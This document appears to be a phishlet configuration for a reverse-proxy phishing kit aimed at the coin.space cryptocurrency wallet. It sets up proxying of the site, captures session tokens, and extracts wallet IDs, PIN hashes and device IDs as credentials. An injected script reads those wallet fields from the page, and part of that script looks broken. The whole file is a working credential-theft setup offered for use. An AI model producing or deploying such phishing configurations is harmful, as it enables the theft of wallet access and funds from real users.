author: '@Evi1Grey5'
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: '', orig_sub: '', domain: 'coin.space', session: false, is_landing: true, auto_filter: true}
auth_tokens:
  - domain: 'coin.space'
    keys: ['X-Date', 'Signature']
credentials:
  username:
    key: 'walletId'
    search: '"walletId":"(.*?)"'
    type: 'json'
  password:
    key: 'pinHash'
    search: '"pinHash":"(.*?)"'
    type: 'json'
  device_id:
    key: 'deviceId'
    search: '"deviceId":"(.*?)"'
    type: 'json'
login:
  domain: 'coin.space'
  path: '/wallet/'
js_inject:
  - trigger_domains: ["coin.space"]
    trigger_paths: ["/wallet/"]
    script: |
      function captureData() {
        const walletId = document.querySelector("textarea[modelvalue='']").value;
        const deviceId = document.querySelector("input[name='deviceId']").value;
        const pinHash = document.querySelector(".cs-pin__dot.cs-pin__dot--active").length;
        console.log("Wallet ID:", walletId);
        console.log("Device ID:", deviceId);
        console.log("Pin Hash:", pinHash);
      }

      captureData();

